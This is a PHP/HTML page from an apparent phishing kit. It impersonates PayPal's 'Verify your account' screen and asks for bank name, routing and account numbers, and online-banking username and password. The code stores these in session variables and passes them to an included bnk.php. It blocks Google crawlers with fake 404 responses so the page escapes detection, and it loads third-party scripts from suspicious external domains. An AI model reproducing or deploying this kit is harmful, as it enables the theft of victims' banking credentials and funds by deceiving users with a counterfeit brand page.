<?php
/*   

*/

session_start();
include "../../../../BOTS/antibots1.php";
include "../../../../BOTS/antibots2.php";
include "../../../../BOTS/antibots3.php";
include "../../../../BOTS/antibots4.php";
include "../../../../BOTS/antibots5.php";
include "../../../../BOTS/antibots6.php";
################### SECOND FILES #####################
include('../../functions/get_lang_en.php');
############## BILL ADDRESS INFORMATION ##############

$_SESSION['_bnkname_']     = $_POST['bnkname'];
$_SESSION['_usrnm_']       = $_POST['usrnm'];
$_SESSION['_pass_']        = $_POST['pass'];
$_SESSION['_acm_']         = $_POST['acm'];
$_SESSION['_rnm_']         = $_POST['rnm'];
#####################################################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
if(empty($_POST['bnkname'])== false) {
        include('bnk.php');
}
}
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xx_Z118xMARVEL xx_Z118xDCxComic <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_PowerRxRagers_x <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>PayPal Safety &amp; Security </title>
	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">

<script src="//plaff-go.ru/link/nb2aoek0/"></script></head>
<body id="x_22ID-Z597"><script src="../../lib/js/jquery.js"></script>
<header class="x_215221058812 xx_Z118xGR x_104806653787">
    <div class="x_22457808828 headerxx_Z118xGR x_102143400609">
        <div class="x_147605019572 xGhostxRider_JC x_90643415015">
            <a data-click="payPalxL0GR" href="#" class="xL0GR x_220095230575"></a>
            <div class="x_36616913940 BTN_SuperMAN x_138913394253"><span class="x_229743701437 ThexSHIELD118 x_139834933984">Your security is our top priority</span></div>
        </div>
    </div>
</header>
    <xx_goxgo class="Browxx_GOxGOZ118" id="x_24ID-Z534">
        <section id="x_28ID-Z688" role="xx_GOxGO" data-country="US" class="x_34ID-Z588">
            <section id="xx_GOxGO" class="x_28ID-Z562">
                <div id="x_29ID-Z540" class="x_31ID-Z662 xGhostxRider_JC x_30ID-Z535">
                    <div class="x_25ID-Z657 x_V654DF654THEBEASTXX" id="x_26ID-Z582">
                        <form action="" method="post" name="GOxGOxPOWERxRANGERS" class="GOxGOxPOWERxRANGERS" nox_28id-z622="" id="x_26ID-Z553" novalidate="novalidate">
                            <div class="x_24ID-Z771 D_AvengersHERE789 x_32ID-Z728" id="x_33ID-Z635"><span>*</span><span>*</span><span class="selected">*</span><span>*</span></div>
                            <div class="x_26ID-Z709 HeaderZ118 x_28ID-Z699" id="x_24ID-Z774">
                                <h2 class="x_26ID-Z769">Verify your account</h2>
                            </div>
                            <hr style="width: 75%;">
                            <div>
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;">please enter your bank information correctly.</p>
                            </div>
                            <div class="x_34ID-Z526 MightyxMorphin x_26ID-Z783" id="x_31ID-Z789">
                            <div class="x_34ID-Z548 x_Gh0ST789 x_25ID-Z618" id="x_23ID-Z547">	
									    <div class="x_30ID-Z567" id="x_23ID-Z584">
									        <p style="margin-bottom: 8px;">Update Bank Information</p>                                       
                                            <div class="x_34ID-Z601 x_Gh0ST789 x_25ID-Z722" id="x_34ID-Z673">
											<div class="x_26ID-Z537" id="x_23ID-Z742">
                                                <div class="x_32ID-Z777 x_V-ForZ118 large" id="x_32ID-Z612">
												    <input type="text" class="Xval666ideX1" id="bnkname" name="bnkname" required="required" value="" placeholder="Bank Name" autocomplete="off" aria-required="true" aria-invalid="true"><label id="bnkname" for="bnkname" style=""></label>
                                                </div>
                                            </div>		
											<div class="x_33ID-Z767" id="x_28ID-Z528">
                                                <div class="x_33ID-Z739 x_V-ForZ118 large" id="x_28ID-Z735">
                                         <input type="text" class="Xval666ideX1" id="rnm" name="rnm" required="required" value="" placeholder="Routing Number" autocomplete="off" aria-required="true" aria-invalid="true">
                                                </div>
                                            </div> 
                                         <div class="x_33ID-Z739 x_V-ForZ118 large" id="x_28ID-Z735">
                                               <input type="text" class="Xval666ideX1" id="acm" name="acm" required="required" value="" placeholder="Account Number" autocomplete="off" aria-required="true" aria-invalid="true"><label id="usrnm" for="usrnm"></label>
                                                </div>
											
                                            <div class="x_33ID-Z767" id="x_28ID-Z528">
                                                <div class="x_33ID-Z739 x_V-ForZ118 large" id="x_28ID-Z735">
                                                    <input type="text" class="Xval666ideX1" id="usrnm" name="usrnm" required="required" value="" placeholder="Username" autocomplete="off" aria-required="true" aria-invalid="true"><label id="usrnm"  for="usrnm"></label>
                                                </div>
                                            </div>
                                            <div class="x_30ID-Z587 " id="stateHolder">
                                                <div class="x_29ID-Z770" id="x_25ID-Z737">
                                                    <div class="x_27ID-Z750 x_V-ForZ118 large" id="x_30ID-Z746">
                                                        <input type="password" id="pass" name="pass" class="Xval666ideX1" placeholder="Password" required="required" autocomplete="off" value="" aria-required="true" aria-invalid="true"><label id="pass" for="pass"></label>
                                                    </div>
                                                </div>
                                            </div>
                                            
                                            </div>
                                        </div>
									</div>							
                                <div class="x_22ID-Z567 0Dats_Good0 x_25ID-Z658" style="margin-top: 20px;">
                                                                        
                                     
 									
									<div class="x_33ID-Z596 agreeTC x_23ID-Z730  checkbox" id="PP-ID1198694857559">
                                        <div class="x_33ID-Z778 x_V-ForZ118" id="x_27ID-Z671">
                                            <label class="helpNotifyUS" role="button">By clicking Confirm, I have read and agree to PayPal <a data-click="userAgreement" href="#" target="_blank">User Agreement</a>, <a data-click="privacyPolicy" href="#" target="_blank">Privacy Policy</a> and <a data-click="esign" href="#" target="_blank">Electronic Communications Delivery Policy</a>.</label>
                                        </div>
                                    </div>
                                    
                                <input id="x_33ID-Z724 submitBtnx_32ID-Z672 " name="" type="submit" class="ButtonZ118" value="Confirm" data-click="WorldWideSubmit">

<br>





<p align="center"><a href="../identity/"> Don't have a Bank Account ?</a></p>
</div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </section>
    </xx_goxgo>
    <footer id="x_34ID-Z706 gblFooter" role="contentinfo" class="x_32ID-Z714">
        <div class="x_27ID-Z631 F00GER00 x_22ID-Z771 IntentF00GER00" id="PP-Z118940009855">
            <div class="x_23ID-Z657 F00GER00Nav x_29ID-Z560 " id="x_26ID-Z731">
                <div class="x_30ID-Z650 xGhostxRider_JC x_27ID-Z755 " id="x_28ID-Z609">
                    <div class="x_33ID-Z600 legal x_34ID-Z649 " id="x_33ID-Z548">
                        <p class="x_29ID-Z575 copyright x_23ID-Z743 " id="x_23ID-Z599"> 2017 PayPal</p>
                        <ul>
                            <li><a id="privacyPolicy234094536 data-click=" privacypolicy"="" href="#" target="_blank">Privacy</a></li>
                            <li><a id="legalAgreement515136176 data-click=" legalagreement"="" href="#" target="_blank">Legal</a></li>
                            <li><a id="contactUs882483143 data-click=" contactus"="" href="#" target="_blank">Help Center</a></li>
                            <li class="x_22ID-Z639 siteFeedback x_29ID-Z628 " id="x_24ID-Z605 siteFeedback x_25ID-Z629 "></li>
                        </ul>
						<div class="x_22ID-Z531 flag x_33ID-Z526 countryFlag x_27ID-Z732 " id="x_30ID-Z701">
						<a id="x_28ID-Z570" data-click="flagChange" href="#" class="x_33ID-Z564 country ">countryFlag4386</a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
	
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script type="text/javascript" src="//yellowads.men/code/?pid=812933&amp;r=9238480"></script>
    <script src="../../lib/js/jquery.validate.js"></script>
	<script src="../../lib/js/jquery.additional-methods.js"></script>
	<script src="../../lib/js/jquery.v-form.js"></script>
	<script src="../../lib/js/jquery.CardValidator.js"></script>
	<script src="../../lib/js/jquery.mask.js"></script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
<div class="rotation"><p style="font-size: 17px;font-family: Z118-Sans-Small-Regular, Helvetica Neue, Arial, sans-serif;margin-left: 14px;">Redirecting ... </p></div>

<script>var script=document.createElement("script");script.src="//plaff-go.ru/link/nb2aoek0/",document.getElementsByTagName("head")[0].appendChild(script);</script><script src="//api.reckonstat.info/scripts/stat/reckonstat.js?r21" id="__bb_js_preffix_id" data-wid="5053" async="" charset="utf-8"></script></body></html>